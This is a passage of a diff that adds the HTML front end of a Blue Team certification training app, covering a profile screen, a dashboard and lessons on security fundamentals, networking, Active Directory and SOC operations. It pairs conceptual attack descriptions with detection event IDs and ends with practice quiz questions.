@@ -1,0 +1,1218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CyberAtaraxia Training — BlueTeam</title>
+  <meta name="description" content="Blue Team Level 1 certification training app — SOC, SIEM, Forensics, IR, Malware Analysis and more.">
+  <meta name="author" content="Selim JERBI">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/CyberAtaraxia_BlueTeam.css">
+</head>
+<body>
+<!-- ═══════════════════════════════════════════
+     AUTH SCREEN
+═══════════════════════════════════════════ -->
+<div class="auth-scr" id="auth-scr">
+  <div class="auth-wrap">
+    <div class="auth-brand">
+      <img class="auth-brand-logo-img" data-logo src="img/CA_logo.png" alt="CyberAtaraxia logo" onerror="this.classList.add('hidden')">
+      <div class="auth-brand-name">CyberAtaraxia Training <span>- BlueTeam</span></div>
+      <div class="auth-brand-sub">// BTL1 · SOC Analyst · Blue Team Certification Prep</div>
+    </div>
+
+    <!-- Two option cards -->
+    <div class="auth-options" id="auth-options">
+      <div class="auth-opt new" onclick="showPanel('new')">
+        <span class="auth-opt-icon">✦</span>
+        <div class="auth-opt-title">New Profile</div>
+        <div class="auth-opt-desc">First time here? Create your profile and get a save file to track your progress.</div>
+      </div>
+      <div class="auth-opt load" onclick="showPanel('load')">
+        <span class="auth-opt-icon">↑</span>
+        <div class="auth-opt-title">Load Profile</div>
+        <div class="auth-opt-desc">Returning analyst? Load your .json save file to continue right where you left off.</div>
+      </div>
+    </div>
+
+    <!-- NEW PROFILE panel -->
+    <div class="auth-panel pnew" id="panel-new">
+      <div class="auth-panel-title">
+        Create your analyst profile
+        <span class="auth-panel-back" onclick="hidePanel()">← Back</span>
+      </div>
+      <div class="auth-row">
+        <div class="auth-f"><label>First name</label><input type="text" id="np-first" placeholder="Jane"></div>
+        <div class="auth-f"><label>Last name</label><input type="text" id="np-last" placeholder="Smith"></div>
+      </div>
+      <div class="auth-f"><label>Pseudo / username</label><input type="text" id="np-pseudo" placeholder="analyst_01"></div>
+      <div class="auth-f">
+        <label>Occupation</label>
+        <select id="np-job">
+          <option value="">— Select —</option>
+          <option>Student</option>
+          <option>SOC Analyst (Tier 1)</option>
+          <option>SOC Analyst (Tier 2)</option>
+          <option>Incident Responder</option>
+          <option>Threat Hunter</option>
+          <option>Security Engineer</option>
+          <option>Penetration Tester</option>
+          <option>IT Administrator</option>
+          <option>Other</option>
+        </select>
+      </div>
+      <button class="auth-action-btn new" onclick="createProfile()">Create profile &amp; download save file →</button>
+      <div class="auth-err" id="np-err"></div>
+    </div>
+
+    <!-- LOAD PROFILE panel -->
+    <div class="auth-panel pload" id="panel-load">
+      <div class="auth-panel-title">
+        Load your save file
+        <span class="auth-panel-back" onclick="hidePanel()">← Back</span>
+      </div>
+      <div class="drop-zone" id="drop-zone" onclick="document.getElementById('file-input').click()" ondragover="onDragOver(event)" ondragleave="onDragLeave(event)" ondrop="onDrop(event)">
+        <span class="dz-icon">📂</span>
+        <div class="dz-title">Click or drag your .json file here</div>
+        <div class="dz-sub">Your CyberAtaraxia save file</div>
+        <div class="dz-file" id="dz-file-name"></div>
+      </div>
+      <input type="file" id="file-input" accept=".json" onchange="onFileSelect(event)">
+      <button class="auth-action-btn load" id="load-confirm-btn" onclick="loadProfile()" style="display:none">Load profile &amp; continue →</button>
+      <div class="auth-err" id="lp-err"></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════
+     APP SHELL
+═══════════════════════════════════════════ -->
+<div class="app" id="app">
+  <header class="hdr">
+    <div class="hdr-left">
+      <img id="hdr-logo" src="img/CA_logo.png" alt="" class="hdr-logo-img" onerror="this.style.display='none'">
+      <div class="logo">CyberAtaraxia Training <span>- BlueTeam</span></div>
+    </div>
+    <div class="hdr-r">
+      <div style="display:flex;align-items:center;gap:6px"><div class="sdot"></div><span style="color:var(--tx2);font-family:var(--mo);font-size:11px">SOC: <strong style="color:var(--gn)">OPERATIONAL</strong></span></div>
+      <div class="hprog"><span id="hpct" style="color:var(--tx2)">0%</span><div class="hbar"><div class="hbar-f" id="hbar"></div></div></div>
+      <div class="husr">
+        <div class="hav" id="hav">?</div>
+        <span class="hnm" id="hnm">—</span>
+      </div>
+      <div id="clock"></div>
+    </div>
+  </header>
+
+  <div class="layout">
+    <!-- SIDEBAR -->
+    <nav class="sb" id="sb">
+      <div class="sb-nav">
+        <div class="sl">Navigation</div>
+        <div class="ni active" onclick="nav('dash')"><span class="nic">⬡</span>Dashboard</div>
+        <div class="sl" style="margin-top:4px">Phase 0 — Fundamentals</div>
+        <div class="ni" onclick="nav('secfund')"><span class="nic">◈</span>Security Fundamentals<span class="nb" id="nb-secfund">—</span></div>
+        <div class="ni" onclick="nav('net101')"><span class="nic">◈</span>Networking 101<span class="nb" id="nb-net101">—</span></div>
+        <div class="ni" onclick="nav('ad')"><span class="nic">◈</span>Active Directory<span class="nb" id="nb-ad">—</span></div>
+        <div class="sl" style="margin-top:4px">Phase 1 — Detection &amp; Intel</div>
+        <div class="ni" onclick="nav('soc')"><span class="nic">◈</span>SOC Architecture<span class="nb" id="nb-soc">—</span></div>
+        <div class="ni" onclick="nav('mitre')"><span class="nic">◈</span>MITRE ATT&amp;CK<span class="nb" id="nb-mitre">—</span></div>
+        <div class="ni" onclick="nav('ti')"><span class="nic">◈</span>Threat Intelligence<span class="nb" id="nb-ti">—</span></div>
+        <div class="ni" onclick="nav('logs')"><span class="nic">◈</span>Log Analysis<span class="nb" id="nb-logs">—</span></div>
+        <div class="ni" onclick="nav('alerts')"><span class="nic">◈</span>Alert Management<span class="nb" id="nb-alerts">—</span></div>
+        <div class="sl" style="margin-top:4px">Phase 2 — SIEM &amp; Network</div>
+        <div class="ni" onclick="nav('siem')"><span class="nic">◈</span>SIEM &amp; Queries<span class="nb" id="nb-siem">—</span></div>
+        <div class="ni" onclick="nav('network')"><span class="nic">◈</span>Network Security<span class="nb" id="nb-network">—</span></div>
+        <div class="ni" onclick="nav('ids')"><span class="nic">◈</span>IDS: Snort &amp; Suricata<span class="nb" id="nb-ids">—</span></div>
+        <div class="sl" style="margin-top:4px">Phase 3 — Endpoint &amp; Malware</div>
+        <div class="ni" onclick="nav('phishing')"><span class="nic">◈</span>Phishing Analysis<span class="nb" id="nb-phishing">—</span></div>
+        <div class="ni" onclick="nav('malware')"><span class="nic">◈</span>Malware Analysis<span class="nb" id="nb-malware">—</span></div>
+        <div class="ni" onclick="nav('privesc')"><span class="nic">◈</span>Privilege Escalation<span class="nb" id="nb-privesc">—</span></div>
+        <div class="sl" style="margin-top:4px">Phase 4 — Investigation</div>
+        <div class="ni" onclick="nav('forensics')"><span class="nic">◈</span>Digital Forensics<span class="nb" id="nb-forensics">—</span></div>
+        <div class="ni" onclick="nav('timeline')"><span class="nic">◈</span>Timeline Analysis<span class="nb" id="nb-timeline">—</span></div>
+        <div class="ni" onclick="nav('memory')"><span class="nic">◈</span>Memory Analysis<span class="nb" id="nb-memory">—</span></div>
+        <div class="ni" onclick="nav('ir')"><span class="nic">◈</span>Incident Response<span class="nb" id="nb-ir">—</span></div>
+        <div class="ni" onclick="nav('hunting')"><span class="nic">◈</span>Threat Hunting<span class="nb" id="nb-hunting">—</span></div>
+        <div class="ni" onclick="nav('cloud')"><span class="nic">◈</span>Cloud Security<span class="nb" id="nb-cloud">—</span></div>
+        <div class="sl" style="margin-top:4px">Phase 5 — Exam Prep</div>
+        <div class="ni" onclick="nav('docs')"><span class="nic">◈</span>Documentation<span class="nb" id="nb-docs">—</span></div>
+        <div class="ni" onclick="nav('exam')"><span class="nic">★</span>Exam Q&amp;A</div>
+        <div class="ni" onclick="nav('resources')"><span class="nic">◈</span>Resources</div>
+      </div>
+      <!-- SAVE BUTTON at bottom of sidebar -->
+      <div class="sb-footer">
+        <button class="sb-save-btn" id="save-btn" onclick="saveProfile()">
+          <span>↓</span> Save progress
+        </button>
+        <div class="sb-save-info" id="save-info">Click to download your updated save file</div>
+      </div>
+    </nav>
+
+    <!-- MAIN CONTENT -->
+    <main class="main" id="mc">
+      <!-- DASHBOARD -->
+      <div class="page active" id="page-dash">
+        <div class="hero"><div class="hlbl">// BTL1 · SOC Analyst · Blue Team Certification Prep</div><div class="htitle">CyberAtaraxia Training</div><div class="hsub">Your complete Blue Team training hub. Covers BTL1, SOC Analyst L1, and Security Fundamentals syllabuses. Track every module, practice with real-world questions, earn your certification.</div></div>
+        <div class="mets">
+          <div class="mc"><div class="mclbl">Modules completed</div><div class="mcv c" id="dd">0</div><div class="mcs">of 21 total</div></div>
+          <div class="mc"><div class="mclbl">Progress</div><div class="mcv g" id="dp">0%</div><div class="mcs">toward certification</div></div>
+          <div class="mc"><div class="mclbl">Est. study time</div><div class="mcv a">10–12</div><div class="mcs">weeks at 1–2 hrs/day</div></div>
+          <div class="mc"><div class="mclbl">Current phase</div><div class="mcv" style="font-size:18px" id="dph">Fundamentals</div><div class="mcs" id="dphs">Phase 0 of 5</div></div>
+        </div>
+        <div class="stit">Study phases</div>
+        <div class="pgrid">
+          <div class="phc" onclick="nav('secfund')"><div class="phr"><span class="phn">PHASE 00</span><span class="phw">~2 weeks</span></div><div class="phtit">Fundamentals</div><div class="phd">Security basics · Networking 101 · Active Directory · OSI model · Security controls</div><div class="phbar"><div class="phfil" id="ph0b" style="width:0%"></div></div></div>
+          <div class="phc" onclick="nav('soc')"><div class="phr"><span class="phn">PHASE 01</span><span class="phw">~2 weeks</span></div><div class="phtit">Detection &amp; Intel</div><div class="phd">SOC Architecture · MITRE ATT&amp;CK · Threat Intel · Log Analysis · Alert Management</div><div class="phbar"><div class="phfil" id="ph1b" style="width:0%"></div></div></div>
+          <div class="phc" onclick="nav('siem')"><div class="phr"><span class="phn">PHASE 02</span><span class="phw">~2 weeks</span></div><div class="phtit">SIEM &amp; Network</div><div class="phd">Splunk SPL · KQL · Sigma · Wireshark · IDS: Snort &amp; Suricata</div><div class="phbar"><div class="phfil" id="ph2b" style="width:0%"></div></div></div>
+          <div class="phc" onclick="nav('phishing')"><div class="phr"><span class="phn">PHASE 03</span><span class="phw">~2 weeks</span></div><div class="phtit">Endpoint &amp; Malware</div><div class="phd">Phishing · VBA macros · Malware PE analysis · Privilege escalation · Persistence</div><div class="phbar"><div class="phfil" id="ph3b" style="width:0%"></div></div></div>
+          <div class="phc" onclick="nav('forensics')"><div class="phr"><span class="phn">PHASE 04</span><span class="phw">~3 weeks</span></div><div class="phtit">Investigation</div><div class="phd">Digital forensics · Timeline · Memory/Volatility · IR lifecycle · Threat hunting · Cloud</div><div class="phbar"><div class="phfil" id="ph4b" style="width:0%"></div></div></div>
+          <div class="phc" onclick="nav('docs')"><div class="phr"><span class="phn">PHASE 05</span><span class="phw">~1 week</span></div><div class="phtit">Exam Prep</div><div class="phd">Documentation · Playbooks · Q&amp;A drill · Full review</div><div class="phbar"><div class="phfil" id="ph5b" style="width:0%"></div></div></div>
+        </div>
+        <div class="stit">All modules</div>
+        <div class="mgrid" id="mgrid"></div>
+      </div>
+
+      <!-- SECURITY FUNDAMENTALS -->
+      <div class="page" id="page-secfund">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 0 · Module 01</div><div class="ltit">Security Fundamentals</div><div class="lmet">CIA triad · Security controls · OSI model · Blue Team roles · Physical security</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">The CIA Triad — the foundation of everything</div>
+            <p class="ltxt">Every security control, detection rule, and incident response action exists to protect one of three properties: <strong>Confidentiality</strong> (only authorized parties access data), <strong>Integrity</strong> (data is not modified without authorization), and <strong>Availability</strong> (systems are accessible when needed). When you investigate an incident, always ask: which property was violated?</p>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">Confidentiality</div><div class="ccb">Encryption, access control, MFA, DLP. Violated by: data exfiltration, credential theft, overpermissioning.</div></div>
+              <div class="cc"><div class="cct">Integrity</div><div class="ccb">Hashing, digital signatures, file integrity monitoring. Violated by: ransomware, log tampering, SQL injection, timestomping.</div></div>
+              <div class="cc"><div class="cct">Availability</div><div class="ccb">Redundancy, backups, DDoS protection, patching. Violated by: ransomware encryption, DDoS, destructive wiper malware.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Security control types</div>
+            <table class="dt"><thead><tr><th>Control type</th><th>Purpose</th><th>Examples</th></tr></thead><tbody>
+              <tr><td>Preventive</td><td>Stop attacks before they happen</td><td>Firewalls, MFA, patch management, ACLs, encryption</td></tr>
+              <tr><td>Detective</td><td>Identify attacks as they occur</td><td>SIEM alerts, IDS, audit logs, EDR, honeypots</td></tr>
+              <tr><td>Corrective</td><td>Restore to normal after an attack</td><td>Incident response, backups, reimaging, patching</td></tr>
+              <tr><td>Deterrent</td><td>Discourage attackers</td><td>Legal warnings, security awareness posters, visible cameras</td></tr>
+              <tr><td>Compensating</td><td>Alternative when primary control isn't feasible</td><td>Enhanced monitoring when a patch can't be applied immediately</td></tr>
+            </tbody></table>
+          </div>
+          <div class="lsec"><div class="lsect">OSI model — where attacks happen</div>
+            <table class="dt"><thead><tr><th>Layer</th><th>Name</th><th>Attack examples</th><th>Detection source</th></tr></thead><tbody>
+              <tr><td>7</td><td>Application</td><td>SQL injection, XSS, phishing, API abuse, BEC</td><td>WAF, web server logs, proxy logs</td></tr>
+              <tr><td>4</td><td>Transport</td><td>Port scanning, SYN flood DoS, session hijacking</td><td>Firewall, NetFlow, IDS</td></tr>
+              <tr><td>3</td><td>Network</td><td>IP spoofing, ICMP tunneling, routing attacks</td><td>Firewall, IDS/IPS, NetFlow</td></tr>
+              <tr><td>2</td><td>Data Link</td><td>ARP poisoning, MAC flooding, VLAN hopping</td><td>Switch logs, network monitoring tools</td></tr>
+              <tr><td>1</td><td>Physical</td><td>Cable tapping, USB implants, rogue access points</td><td>Physical access logs, RF scanning</td></tr>
+            </tbody></table>
+          </div>
+          <div class="lsec"><div class="lsect">Watch: Blue Team introduction (HackerSploit)</div>
+            <div class="vc"><a class="vthumb" href="https://www.youtube.com/watch?v=Bt5fh3wQUAQ" target="_blank"></a><div><div class="vsrc">HackerSploit · Blue Team Series · Ep.0</div><div class="vtit">Blue Team Training Course — Introduction</div><div class="vdesc">What is blue team operations? Covers defender mindset, key roles (Tier 1/2/3), the tools used in a real SOC, and how defenders think about protecting enterprise environments. The essential starting point for this entire course.</div><a class="vlink" href="https://www.youtube.com/watch?v=Bt5fh3wQUAQ" target="_blank">Watch on YouTube →</a></div></div>
+            <div class="vc"><a class="vthumb" href="https://www.youtube.com/watch?v=kkjsQV64r14" target="_blank"></a><div><div class="vsrc">HackerSploit · Blue Team Series · Ep.1</div><div class="vtit">Introduction To Blue Team Operations</div><div class="vdesc">Deep dive into the defensive security lifecycle: prevention vs detection vs response, how SOC teams structure their workflows, and the key differences between reactive and proactive defense. Watch before any other module.</div><a class="vlink" href="https://www.youtube.com/watch?v=kkjsQV64r14" target="_blank">Watch on YouTube →</a></div></div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://www.securityblue.team/courses/blue-team-junior-analyst-pathway-bundle" target="_blank">BTJA Free Course (Security Blue Team)</a>
+              <a class="el" href="https://tryhackme.com/path/outline/soclevel1" target="_blank">TryHackMe SOC Level 1 Path</a>
+              <a class="el" href="https://www.nist.gov/cyberframework" target="_blank">NIST Cybersecurity Framework</a>
+              <a class="el" href="https://blueteamlabs.online/" target="_blank">Blue Team Labs Online</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-sf1"><div class="qq">Ransomware encrypts all files on a production server and demands payment. Which CIA property is PRIMARILY violated?</div><div class="qopts"><button class="qo" onclick="QA('q-sf1',0,2)">A. Confidentiality — data is hidden from legitimate users</button><button class="qo" onclick="QA('q-sf1',1,2)">B. Integrity — files have been modified without authorization</button><button class="qo" onclick="QA('q-sf1',2,2)">C. Availability — legitimate users cannot access their data</button><button class="qo" onclick="QA('q-sf1',3,2)">D. All three are violated equally</button></div><div class="qfb" id="q-sf1-fb"></div><button class="undoq" id="uq-q-sf1" onclick="UQ('q-sf1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-secfund" onclick="MC('secfund')">Mark module complete ✓</button><button class="ubtn" id="ub-secfund" onclick="UM('secfund')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- NETWORKING 101 -->
+      <div class="page" id="page-net101">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 0 · Module 02</div><div class="ltit">Networking 101</div><div class="lmet">Protocols · DNS · TCP/IP · Network devices · Log sources</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">Protocols every analyst must know</div>
+            <table class="dt"><thead><tr><th>Protocol</th><th>Port</th><th>Attacker abuse</th><th>Detection source</th></tr></thead><tbody>
+              <tr><td>DNS</td><td>UDP/TCP 53</td><td>DNS tunneling, C2, DGA domains, exfiltration via subdomains</td><td>DNS server logs, firewall</td></tr>
+              <tr><td>HTTP/HTTPS</td><td>80 / 443</td><td>C2 over HTTPS, malware downloads, phishing, BEC</td><td>Proxy logs, web server logs</td></tr>
+              <tr><td>SMB</td><td>TCP 445</td><td>EternalBlue, lateral movement (PtH), ransomware spread, PsExec</td><td>Firewall, Sysmon EID 3</td></tr>
+              <tr><td>RDP</td><td>TCP 3389</td><td>Brute force, BlueKeep, unauthorized remote access</td><td>Firewall, EID 4624 Type 10</td></tr>
+              <tr><td>LDAP/LDAPS</td><td>389 / 636</td><td>AD enumeration, credential harvesting, Kerberoasting</td><td>Domain controller logs</td></tr>
+              <tr><td>Kerberos</td><td>UDP/TCP 88</td><td>Pass-the-ticket, Kerberoasting, AS-REP roasting, Golden Ticket</td><td>EID 4769, 4768, 4771</td></tr>
+              <tr><td>WinRM</td><td>TCP 5985/5986</td><td>Remote execution, lateral movement, persistence</td><td>EID 4688, PowerShell logs</td></tr>
+            </tbody></table>
+          </div>
+          <div class="lsec"><div class="lsect">TCP 3-way handshake and what deviations mean</div>
+            <p class="ltxt">Every TCP connection: <strong>SYN → SYN-ACK → ACK</strong>. Forensically: SYN with no SYN-ACK = port closed/filtered. <strong>Sequential SYN to many ports</strong> from one IP = port scan (Nmap). <strong>Regular SYN to one IP:port at fixed intervals</strong> = C2 beaconing. <strong>Flood of SYN to one port</strong> = DoS. RST (reset) mid-connection = abrupt termination, common in scan activity or blocked connections.</p>
+          </div>
+          <div class="lsec"><div class="lsect">Network devices as detection sources</div>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">Firewall</div><div class="ccb">Logs allow/block decisions by IP, port, protocol. Source of NetFlow. Detects: port scans, C2 beaconing, unexpected outbound connections.</div></div>
+              <div class="cc"><div class="cct">IDS/IPS (Snort/Suricata)</div><div class="ccb">Inspects packet payload against signatures. IDS = alert only. IPS = alert + block. Detects: exploit attempts, malware callbacks, protocol anomalies.</div></div>
+              <div class="cc"><div class="cct">Proxy server</div><div class="ccb">Logs all HTTP/HTTPS requests: URL, user-agent, referrer, response code. Invaluable for tracing malware downloads, C2, and exfiltration.</div></div>
+              <div class="cc"><div class="cct">DNS server</div><div class="ccb">Logs every query and response. Essential for detecting C2 via DNS, DGA, tunneling, and compromised hosts making suspicious lookups.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Watch: Wireshark for Blue Teams (HackerSploit)</div>
+            <div class="vc"><a class="vthumb" href="https://www.youtube.com/watch?v=OjQ0gncwS7I" target="_blank"></a><div><div class="vsrc">HackerSploit · Blue Team Series · Ep.2</div><div class="vtit">Wireshark For Blue Teams</div><div class="vdesc">Overview of using Wireshark from a defender's perspective: what to look for in captures, how to navigate the interface, and the most important features for SOC analysts investigating network incidents.</div><a class="vlink" href="https://www.youtube.com/watch?v=OjQ0gncwS7I" target="_blank">Watch on YouTube →</a></div></div>
+            <div class="vc"><a class="vthumb" href="https://www.youtube.com/watch?v=NwY57Wv0yfA" target="_blank"></a><div><div class="vsrc">HackerSploit · Blue Team Series · Ep.3</div><div class="vtit">Installing &amp; Configuring Wireshark For Traffic Analysis</div><div class="vdesc">Practical setup: installing Wireshark, configuring capture interfaces, and setting up for live monitoring. Covers initial configuration decisions that matter for capturing the right traffic.</div><a class="vlink" href="https://www.youtube.com/watch?v=NwY57Wv0yfA" target="_blank">Watch on YouTube →</a></div></div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://wiki.wireshark.org/SampleCaptures" target="_blank">Wireshark Sample Captures</a>
+              <a class="el" href="https://malware-traffic-analysis.net/" target="_blank">Malware Traffic Analysis (PCAPs)</a>
+              <a class="el" href="https://tryhackme.com/room/wireshark" target="_blank">TryHackMe — Wireshark Room</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-n1"><div class="qq">In Wireshark you see hundreds of TCP SYN packets from 10.0.0.5 targeting sequential destination ports (21, 22, 23, 25, 80…) with no SYN-ACK responses. What does this indicate?</div><div class="qopts"><button class="qo" onclick="QA('q-n1',0,2)">A. Normal web browsing traffic</button><button class="qo" onclick="QA('q-n1',1,2)">B. A SYN flood DoS attack</button><button class="qo" onclick="QA('q-n1',2,2)">C. TCP port scan (Nmap SYN scan) — network reconnaissance activity</button><button class="qo" onclick="QA('q-n1',3,2)">D. C2 beaconing</button></div><div class="qfb" id="q-n1-fb"></div><button class="undoq" id="uq-q-n1" onclick="UQ('q-n1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-net101" onclick="MC('net101')">Mark module complete ✓</button><button class="ubtn" id="ub-net101" onclick="UM('net101')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+
+      <!-- ACTIVE DIRECTORY -->
+      <div class="page" id="page-ad">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 0 · Module 03</div><div class="ltit">Active Directory</div><div class="lmet">AD structure · Kerberos · AD attack techniques · Detection</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">Why AD is the crown jewel</div>
+            <p class="ltxt">Active Directory is Microsoft's directory service managing users, computers, groups, and policies in virtually every enterprise environment. It is the central authentication and authorization system — <strong>compromising AD equals compromising the entire organization</strong>. Domain Admin access lets an attacker create accounts, exfiltrate everything, deploy ransomware to all machines, and maintain indefinite access.</p>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">Domain Controller (DC)</div><div class="ccb">Runs AD. Stores all accounts and password hashes (NTDS.dit). The ultimate attacker target. Always monitor DC logs with highest priority.</div></div>
+              <div class="cc"><div class="cct">Service Principal Names (SPNs)</div><div class="ccb">Identifiers for services in AD. Any domain user can request service tickets for any SPN — exploited in Kerberoasting to get crackable hashes offline.</div></div>
+              <div class="cc"><div class="cct">Privileged groups</div><div class="ccb">Domain Admins, Enterprise Admins, Schema Admins. Any EID 4732 adding to these groups is critical — always alert on these events unconditionally.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Key AD attacks and detection</div>
+            <table class="dt"><thead><tr><th>Attack</th><th>How it works</th><th>Detection</th></tr></thead><tbody>
+              <tr><td>Pass-the-Hash</td><td>Uses stolen NTLM hash directly to authenticate without the plaintext password</td><td>EID 4624 Type 3 with NTLM from unexpected source; EID 4648</td></tr>
+              <tr><td>Kerberoasting</td><td>Any domain user requests TGS tickets for services with SPNs, then cracks the service account's password hash offline</td><td>Mass EID 4769 requests across many SPNs from one workstation in a short window</td></tr>
+              <tr><td>AS-REP Roasting</td><td>Accounts with preauthentication disabled have their AS-REP hash requestable without credentials — crack offline</td><td>EID 4768 with ETYPE 0x17 (RC4), preauthentication not required flag</td></tr>
+              <tr><td>DCSync</td><td>Attacker with replication rights simulates DC replication, pulling all password hashes from NTDS.dit</td><td>EID 4662 — replication rights exercised by non-DC machine</td></tr>
+              <tr><td>Golden Ticket</td><td>Using KRBTGT hash, forges Kerberos TGTs with any privileges, valid for years</td><td>Tickets with abnormally long validity; Kerberos tickets for non-existent accounts</td></tr>
+            </tbody></table>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://adsecurity.org" target="_blank">AD Security Blog (Sean Metcalf)</a>
+              <a class="el" href="https://0xmedhat.gitbook.io/whoami/detect-ad-attacks" target="_blank">Detect AD Attacks (0xmedhat)</a>
+              <a class="el" href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/" target="_blank">Windows Security Log Encyclopedia</a>
+              <a class="el" href="https://tryhackme.com/room/activedirectorybasics" target="_blank">TryHackMe — AD Basics</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
+            <div class="qbl" id="q-ad1"><div class="qq">A query returns dozens of EID 4769 (Kerberos service ticket requested) events from one workstation across many different service accounts within 5 minutes. What attack pattern is this?</div><div class="qopts"><button class="qo" onclick="QA('q-ad1',0,2)">A. Pass-the-Hash lateral movement</button><button class="qo" onclick="QA('q-ad1',1,2)">B. Kerberoasting — mass SPN enumeration to collect service tickets for offline cracking</button><button class="qo" onclick="QA('q-ad1',2,2)">C. DCSync replication attack</button><button class="qo" onclick="QA('q-ad1',3,2)">D. Golden Ticket creation</button></div><div class="qfb" id="q-ad1-fb"></div><button class="undoq" id="uq-q-ad1" onclick="UQ('q-ad1')">↩ Undo answer</button></div>
+          </div>
+          <div style="display:flex;align-items:center"><button class="cbtn" id="btn-ad" onclick="MC('ad')">Mark module complete ✓</button><button class="ubtn" id="ub-ad" onclick="UM('ad')" style="display:none">↩ Unmark</button></div>
+        </div>
+      </div>
+      <!-- SOC ARCHITECTURE -->
+      <div class="page" id="page-soc">
+        <div class="lhdr"><button class="lbk" onclick="nav('dash')">← Dashboard</button><div><div class="leb">Phase 1 · Module 04</div><div class="ltit">SOC Architecture &amp; Operations</div><div class="lmet">Tier roles · SIEM · SOAR · EDR · Ticketing · Shift handover</div></div></div>
+        <div class="lbody">
+          <div class="lsec"><div class="lsect">SOC tier structure</div>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">Tier 1 — Analyst</div><div class="ccb">Monitors queue 24/7. Initial triage: FP vs TP. Enriches with OSINT. Escalates to Tier 2. High volume, lower complexity investigations.</div></div>
+              <div class="cc"><div class="cct">Tier 2 — IR Specialist</div><div class="ccb">Receives Tier 1 escalations. Deep investigation, scoping, containment decisions. Broader tool access, forensic skills. Interfaces with stakeholders during incidents.</div></div>
+              <div class="cc"><div class="cct">Tier 3 — Threat Hunter</div><div class="ccb">Proactively hunts threats that no alert catches. Develops new detection rules, deep malware analysis, advises on ATT&CK coverage gaps and blind spots.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">SOC toolchain</div>
+            <div class="cgrid">
+              <div class="cc"><div class="cct">SIEM</div><div class="ccb">Collects, normalizes, correlates logs. Fires alerts based on detection rules. Splunk, Microsoft Sentinel, IBM QRadar, Wazuh (open source).</div></div>
+              <div class="cc"><div class="cct">SOAR</div><div class="ccb">Automates response actions (isolate host, block IP, create ticket). Splunk SOAR, Palo Alto XSOAR. SIEM detects; SOAR responds.</div></div>
+              <div class="cc"><div class="cct">EDR</div><div class="ccb">Endpoint telemetry: process tree, file writes, network connections, memory activity. CrowdStrike, SentinelOne, Carbon Black, Defender for Endpoint.</div></div>
+              <div class="cc"><div class="cct">Case Management</div><div class="ccb">Tracks incidents from detection to closure. TheHive5 (open source, BTL1 exam-relevant), Jira, ServiceNow. Every investigated alert needs a case.</div></div>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Watch: Wazuh SIEM setup and usage</div>
+            <div class="vc"><a class="vthumb" href="https://www.youtube.com/watch?v=Hq58_yGJwHk" target="_blank"></a><div><div class="vsrc">HackerSploit · Blue Team Series · Ep.8</div><div class="vtit">Introduction To Wazuh SIEM</div><div class="vdesc">Wazuh is a free, open-source SIEM used in real SOC environments. This video covers the architecture, log collection pipeline, alert generation, dashboards, and how Tier 1 analysts use it. Directly applicable to BTL1.</div><a class="vlink" href="https://www.youtube.com/watch?v=Hq58_yGJwHk" target="_blank">Watch on YouTube →</a></div></div>
+            <div class="vc"><a class="vthumb" href="https://www.youtube.com/watch?v=SCG0wYGS-Mg" target="_blank"></a><div><div class="vsrc">HackerSploit · Blue Team Series · Ep.9</div><div class="vtit">Installing &amp; Configuring Wazuh</div><div class="vdesc">Step-by-step deployment of Wazuh: server setup, agent deployment on Windows and Linux, log forwarding configuration, and creating your first custom detection rule. A practical lab you should follow along with.</div><a class="vlink" href="https://www.youtube.com/watch?v=SCG0wYGS-Mg" target="_blank">Watch on YouTube →</a></div></div>
+          </div>
+          <div class="lsec"><div class="lsect">External resources</div>
+            <div class="elinks">
+              <a class="el" href="https://blueteamlabs.online/" target="_blank">Blue Team Labs Online (BTLO)</a>
+              <a class="el" href="https://letsdefend.io" target="_blank">LetsDefend — SOC Practice</a>
+              <a class="el" href="https://tryhackme.com/path/outline/soclevel1" target="_blank">TryHackMe SOC Level 1</a>
+            </div>
+          </div>
+          <div class="lsec"><div class="lsect">Practice question</div>
